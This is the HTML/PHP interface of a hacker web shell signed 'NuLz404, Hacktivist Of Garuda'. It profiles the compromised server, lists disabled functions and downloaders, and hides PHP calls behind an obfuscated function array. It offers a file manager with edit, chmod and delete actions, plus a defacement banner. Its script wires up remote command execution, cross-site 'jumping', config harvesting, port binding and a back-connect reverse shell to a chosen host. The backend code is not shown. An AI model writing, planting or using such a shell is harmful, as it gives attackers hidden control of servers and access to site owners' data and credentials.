                                    <td>IP Server</td>
                                    <td> :
                                        <?=(!@$_SERVER["SERVER_ADDR"] ? ($func[49]("gethostbyname") ? @$func[40]($_SERVER['SERVER_NAME']) : '????') : @$_SERVER["SERVER_ADDR"]) ?>
                                    </td>
                                </tr>
                                <tr>
                                    <td>Storage</td>
                                    <td class="d-flex">: Total = <?= formatSize($total) ?>, Free =
                                        <?= formatSize($free) ?> [<?= $pers ?>%]</td>
                                </tr>
                                <tr>
                                    <td>Domains</td>
                                    <td>: <?= $dom ?></td>
                                </tr>
                                <tr>
                                    <td>Software</td>
                                    <td>: <?= $_SERVER['SERVER_SOFTWARE'] ?></td>
                                </tr>
                                <tr>
                                    <td>Disable Functions</td>
                                    <td>: <?= $show_ds ?></td>
                                </tr>
                                <tr>
                                    <td>Useful Functions</td>
                                    <td>: <?= rtrim($useful, ', ') ?></td>
                                </tr>
                                <tr>
                                    <td>Downloader</td>
                                    <td>: <?= rtrim($downloader, ', ') ?></td>
                                </tr>
                                <tr>
                                    <td colspan="2">CURL :
                                        <?= $func[49]('curl_version') ? '<font style="color: #04D000; text-shadow: 0 0 15px rgba(255,255,255,0.3);">ON</font>' : '<font class="text-danger">OFF</font>' ?>
                                        | SSH2 :
                                        <?= $func[49]('ssh2_connect') ? '<font style="color: #04D000; text-shadow: 0 0 15px rgba(255,255,255,0.3);">ON</font>' : '<font class="text-danger">OFF</font>' ?>
                                        | Magic Quotes :
                                        <?= $func[49]('get_magic_quotes_gpc') ? '<font style="color: #04D000; text-shadow: 0 0 15px rgba(255,255,255,0.3);">ON</font>' : '<font class="text-danger">OFF</font>' ?>
                                        | MySQL :
                                        <?= $func[49]('mysql_get_client_info') || $func[83]('mysqli') ? '<font style="color: #04D000; text-shadow: 0 0 15px rgba(255,255,255,0.3);">ON</font>' : '<font class="text-danger">OFF</font>' ?>
                                        | MSSQL :
                                        <?= $func[49]('mssql_connect') ? '<font style="color: #04D000; text-shadow: 0 0 15px rgba(255,255,255,0.3);">ON</font>' : '<font class="text-danger">OFF</font>' ?>
                                        | PostgreSQL :
                                        <?= $func[49]('pg_connect') ? '<font style="color: #04D000; text-shadow: 0 0 15px rgba(255,255,255,0.3);">ON</font>' : '<font class="text-danger">OFF</font>' ?>
                                        | Oracle :
                                        <?= $func[49]('oci_connect') ? '<font style="color: #04D000; text-shadow: 0 0 15px rgba(255,255,255,0.3);">ON</font>' : '<font class="text-danger">OFF</font>' ?>
                                    </td>
                                </tr>
                                <tr>
                                    <td colspan="2">Safe Mode :
                                        <?=@$func[31]('safe_mode') ? '<font style="color: #04D000; text-shadow: 0 0 15px rgba(255,255,255,0.3);">ON</font>' : '<font class="text-danger">OFF</font>' ?>
                                        | Open Basedir : <?= $open_b ?> | Safe Mode Exec Dir :
                                        <?=@$func[31]('safe_mode_exec_dir') ? '<font style="color: #04D000; text-shadow: 0 0 15px rgba(255,255,255,0.3);">' . @$func[31]('safe_mode_exec_dir') . '</font>' : '<font class="text-warning">NONE</font>' ?>
                                        | Safe Mode Include Dir :
                                        <?=@$func[31]('safe_mode_include_dir') ? '<font style="color: #04D000; text-shadow: 0 0 15px rgba(255,255,255,0.3);">' . @$func[31]('safe_mode_include_dir') . '</font>' : '<font class="text-warning">NONE</font>' ?>
                                    </td>
                                </tr>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
            <div class="col-md-12 my-3">
                <div class="card bg-dark border-light fw-bold">
                    <div class="card-body" style="color: #ffffff;">
                        <h5><i class="fa fa-wave-square"></i> Path </h5>
                        <nav aria-label="breadcrumb" style="--bs-breadcrumb-divider: '/';">
                            <ol class="breadcrumb">
                                <?php
                                $numDir = $func[61]($scdir);
                                foreach ($scdir as $id => $pat) {
                                    if ($pat == '' && $id == 0) {
                                        echo '<li class="breadcrumb-item"><a class="text-decoration-none" style="color: #ffffff;" href="?dir=/">/</a></li>';
                                        continue;
                                    }
                                    if ($pat == '')
                                        continue;
                                    if ($id + 1 == $numDir) {
                                        echo '<li class="breadcrumb-item active" style="color: #00ff00;" aria-current="page">' . $pat . '</li>';
                                    } else {
                                        echo '<li class="breadcrumb-item"><a class="text-decoration-none" style="color: #ffee00;" href="?dir=';
                                        for ($i = 0; $i <= $id; $i++) {
                                            echo "$scdir[$i]";
                                            if ($i != $id)
                                                echo "/";
                                        }
                                        echo '">' . $pat . '</a></li>';
                                    }
                                }
                                ?>
                            </ol>
                        </nav>
                        [ <?= checkPerm($dir, perms($dir)) ?> ]
                    </div>
                </div>
            </div>
            <div class="col-md-12" id="main">
                <div class="card bg-dark border-light fw-bold overflow-auto">
                    <div class="card-body">
                        <h5><i class="fa fa-<?= $icon ?>"></i> <?= $title ?></h5>
                        <?php if ($do == 'view'): ?>
                        <h1>NuLz404 Was Here!</h1>
                        <?php else: ?>
                        <?php if ($func[9]($dir)): ?>
                        <div class="table-responsive">
                            <table class="table text-nowrap text-white">
                                <thead>
                                    <tr>
                                        <th>Name</th>
                                        <th>Type</th>
                                        <th>Size</th>
                                        <th>Last Modified</th>
                                        <th>Owner/Group</th>
                                        <th>Permission</th>
                                        <th>Action</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php
                                    foreach ($scandir as $item):
                                        if (!$func[6]($dir . '/' . $item))
                                            continue;
                                        ?>
                                    <tr>
                                        <td>
                                            <?php if ($item === '..'): ?>
                                            <a href="?dir=<?= $func[28]($dir); ?>"
                                                class="text-decoration-none text-white"><i
                                                    class="fa fa-folder-open text-warning"></i> <?= $item ?></a>
                                            <?php elseif ($item === '.'): ?>
                                            <a href="?dir=<?= $dir; ?>" class="text-decoration-none text-white"><i
                                                    class="fa fa-folder-open text-warning"></i> <?= $item ?></a>
                                            <?php else: ?>
                                            <a href="?dir=<?= $dir . '/' . $item ?>"
                                                class="text-decoration-none text-white"><i
                                                    class="fa fa-folder text-warning"></i> <?= checkName($item); ?></a>
                                            <?php endif; ?>
                                        </td>
                                        <td class="text-warning"><?= $func[38]($item) ?></td>
                                        <td class="align-middle">--</td>
                                        <td class="text-primary"><?= $func[19]("Y-m-d h:i:s", $func[20]($item)); ?></td>
                                        <td><?= getowner($item) ?></td>
                                        <td><?= checkPerm($dir . '/' . $item, perms($dir . '/' . $item)) ?></td>
                                        <td>
                                            <button type="button" class="btn btn-outline-light btn-sm mr-1"
                                                <?= $item === ".." || $item === "." ? '' : 'data-bs-toggle="modal" data-bs-target="#renameModal" data-bs-name="' . $item . '"' ?>><i
                                                    class="fa fa-edit"></i></button>
                                            <button type="button" class="btn btn-outline-light btn-sm mr-1"
                                                <?= $item === ".." || $item === "." ? '' : 'data-bs-toggle="modal" data-bs-target="#deleteModal" data-bs-file="' . $dir . '/' . $item . '"' ?>><i
                                                    class="fa fa-trash-alt"></i></button>
                                        </td>
                                    </tr>
                                    <?php endforeach; ?>
                                    <?php foreach ($scandir as $item):
                                    if (!$func[7]($dir . '/' . $item))
                                        continue;
                                    ?>
                                    <tr>
                                        <td class="fw-normal"><a onclick="getSource('<?= $dir . '/' . $item ?>', this)"
                                                data-bs-name="<?= $item ?>"><i
                                                    class="fa fa-<?= geticon($item) ?> text-info"></i>
                                                <?= checkName($item); ?></a></td>
                                        <td class="text-info">
                                            <?= checkName(($func[49]('mime_content_type') ? $func[63]($item) : $func[38]($item))) ?>
                                        </td>
                                        <td><?= formatSize($func[10]($item)) ?></td>
                                        <td class="text-primary"><?= $func[19]("Y-m-d h:i:s", $func[20]($item)); ?></td>
                                        <td><?= getowner($item) ?></td>
                                        <td><?= checkPerm($dir . '/' . $item, perms($dir . '/' . $item)) ?></td>
                                        <td>
                                            <button type="button" class="btn btn-outline-light btn-sm mr-1"
                                                data-bs-toggle="modal" data-bs-target="#renameModal"
                                                data-bs-name="<?= $item ?>"><i class="fa fa-edit"></i></button>
                                            <button type="button" class="btn btn-outline-light btn-sm mr-1"
                                                data-bs-name="<?= $item ?>"
                                                onclick="getSource('<?= $dir . '/' . $item ?>', this)"><i
                                                    class="fa fa-file-signature"></i></button>
                                            <button type="button" class="btn btn-outline-light btn-sm mr-1"
                                                data-bs-toggle="modal" data-bs-target="#downloadModal"
                                                data-bs-file="<?= $dir . '/' . $item ?>"><i
                                                    class="fa fa-download"></i></button>
                                            <button type="button" class="btn btn-outline-light btn-sm mr-1"
                                                data-bs-toggle="modal" data-bs-target="#deleteModal"
                                                data-bs-file="<?= $dir . '/' . $item ?>"><i
                                                    class="fa fa-trash-alt"></i></button>
                                        </td>
                                    </tr>
                                    <?php endforeach; ?>
                                </tbody>
                            </table>
                        </div>
                        <?php else: ?>
                        <font style="color: #ff0000;">Can't read this directory!</font>
                        <?php endif; ?>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
            <div class="col-md-12 my-3">
                <div class="card bg-dark fw-bold border-light">
                    <div class="card-body text-center">
                        <span style="color: #ffffff;">Copyright © <span style="color: #ff0000;">
                                <font color="#03dbfc">NuLz404</font><br>Hacktivist Of Garuda
                            </span></span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="renameModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1"
        aria-labelledby="renameModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content bg-dark text-white"
                style="border-radius: 15px; box-shadow: 0 0 15pt rgba(255,255,255,0.2);">
                <div class="modal-header">
                    <h5 class="modal-title" id="renameModalLabel">Rename</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <form method="post" id="rename-form">
                    <div class="modal-body">
                        <div class="mb-3">
                            <label for="newname" class="col-form-label">New Name:</label>
                            <input type="text" class="form-control" name="newname" id="newname">
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                        <button type="submit" class="btn btn-primary">Rename</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <div class="modal fade" id="chmodModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1"
        aria-labelledby="chmodModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content bg-dark text-white"
                style="border-radius: 15px; box-shadow: 0 0 15pt rgba(255,255,255,0.2);">
                <div class="modal-header">
                    <h5 class="modal-title" id="renameModalLabel">Change Permission</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <form method="post" id="chmod-form">
                    <div class="modal-body">
                        <div class="mb-3">
                            <label for="newperm" class="col-form-label">New Permission:</label>
                            <input type="text" class="form-control" name="perm" id="newperm">
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                        <button type="submit" class="btn btn-primary">Save</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <div class="modal fade" id="deleteModal" aria-hidden="true" aria-labelledby="deleteModalToggleLabel2"
        data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content bg-dark text-white"
                style="border-radius: 15px; box-shadow: 0 0 15pt rgba(255,255,255,0.2);">
                <div class="modal-header">
                    <h5 class="modal-title" id="exampleModalToggleLabel2">Delete</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    Are you sure want to delete this?
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    <a href="" class="btn btn-danger" id="delete-confirm">Delete</a>
                </div>

            </div>
        </div>
    </div>

    <div class="modal fade" id="downloadModal" aria-hidden="true" aria-labelledby="deleteModalToggleLabel2"
        data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content bg-dark text-white"
                style="border-radius: 15px; box-shadow: 0 0 15pt rgba(255,255,255,0.2);">
                <div class="modal-header">
                    <h5 class="modal-title" id="exampleModalToggleLabel2">Download</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    Are you sure want to download this?
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    <a href="" class="btn btn-danger" id="download-confirm" download>Download</a>
                </div>

            </div>
        </div>
    </div>

    <div class="modal fade" id="viewModal" aria-hidden="true" aria-labelledby="deleteModalToggleLabel2"
        data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content bg-dark text-white"
                style="border-radius: 15px; box-shadow: 0 0 15pt rgba(255,255,255,0.2);">
                <div class="modal-header">
                    <h5 class="modal-title" id="exampleModalToggleLabel2">View</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <form action="" method="post">
                    <div class="modal-body">
                        <div class="mb-3">
                            <label for="content" class="col-form-label">Content:</label>
                            <textarea class="form-control"
                                style="background: transparent; color: #00ff00; font-family: 'Martian Mono', monospace; font-size: 1.55vh;"
                                id="content" rows="15" name="content"></textarea>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                        <button type="submit" class="btn btn-primary">Save</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous">
    </script>
    <script>
    var renameModal = document.getElementById('renameModal')
    var chmodModal = document.getElementById('chmodModal')
    var deleteModal = document.getElementById('deleteModal')
    var downloadModal = document.getElementById('downloadModal')

    renameModal.addEventListener('show.bs.modal', function(event) {
        var button = event.relatedTarget
        var name = button.getAttribute('data-bs-name')
        var modalTitle = renameModal.querySelector('.modal-title')
        var modalBodyInput = renameModal.querySelector('.modal-body input')
        var hiddenInput = document.createElement('input')
        hiddenInput.type = "hidden";
        hiddenInput.value = name;
        hiddenInput.name = "oldname";
        document.getElementById("rename-form").appendChild(hiddenInput);

        modalBodyInput.value = name
    })

    chmodModal.addEventListener('show.bs.modal', function(event) {
        var button = event.relatedTarget
        var perm = button.getAttribute('data-bs-perm')
        var name = button.getAttribute('data-bs-name')
        var modalTitle = chmodModal.querySelector('.modal-title')
        var modalBodyInput = chmodModal.querySelector('.modal-body input')
        var hiddenInput = document.createElement('input')
        hiddenInput.type = "hidden";
        hiddenInput.value = name;
        hiddenInput.name = "filename";
        document.getElementById("chmod-form").appendChild(hiddenInput);

        modalBodyInput.value = perm
    })

    deleteModal.addEventListener('show.bs.modal', function(event) {
        var button = event.relatedTarget
        var file = button.getAttribute('data-bs-file')
        var deleteConfirm = document.getElementById('delete-confirm')
        deleteConfirm.href = '?dir=' + file + '&do=delete'
    })

    downloadModal.addEventListener('show.bs.modal', function(event) {
        var button = event.relatedTarget
        var file = button.getAttribute('data-bs-file')
        var downloadConfirm = document.getElementById('download-confirm')
        downloadConfirm.href = file
    })

    function getSource(filename, d) {
        fetch(window.location.pathname + '?do=get-source&filename=' + filename)
            .then(res => res.text())
            .then(function(data) {
                var viewModal = document.getElementById('viewModal')
                var myModal = new bootstrap.Modal(viewModal)
                var name = d.getAttribute('data-bs-name')
                var modalTitle = viewModal.querySelector('.modal-title')
                var modalContent = viewModal.querySelector('.modal-body textarea')
                var hiddenInput = document.createElement('input')
                hiddenInput.type = "hidden";
                hiddenInput.value = name;
                hiddenInput.name = "filename";
                viewModal.querySelector("form").appendChild(hiddenInput);

                modalTitle.textContent = 'Edit ' + name
                modalContent.value = data
                myModal.show(viewModal)
            })
    }

    function terminal(e) {
        var cmd = e.value;
        fetch(window.location.pathname + '?do=terminal&command=' + cmd)
            .then(res => res.text())
            .then(function(data) {
                var termRes = document.getElementById('terminal-res');
                termRes.innerHTML = data
                e.value = ''
            })
    }

    function jumping(e) {
        fetch(window.location.pathname + '?do=jumping')
            .then(res => res.text())
            .then(function(data) {
                var jumpRes = document.getElementById('jumping-res');
                jumpRes.innerHTML = data
            })
    }

    function getConfig(e) {
        fetch(window.location.pathname + '?do=get-config')
            .then(res => res.text())
            .then(function(data) {
                var confRes = document.getElementById('config-res');
                confRes.innerHTML = data
            })
    }

    function bindPort(e) {
        var port = document.getElementById('bind-port').value
        fetch(window.location.pathname + '?do=bind-port&port=' + port)
            .then(res => res.text())
            .then(function(data) {
                var netRes = document.getElementById('network-res');
                netRes.innerHTML = data
            })
    }

    function backConnect(e) {
        var host = document.getElementById('bc-host').value
        var port = document.getElementById('bc-port').value
        var within = document.getElementById('bc-with').value
        fetch(window.location.pathname + '?do=back-connect&host=' + host + '&port=' + port + '&with=' + within)
            .then(res => res.text())
            .then(function(data) {
                var netRes = document.getElementById('network-res');
                netRes.innerHTML = data
            })
    }
    </script>
</body>

</html>
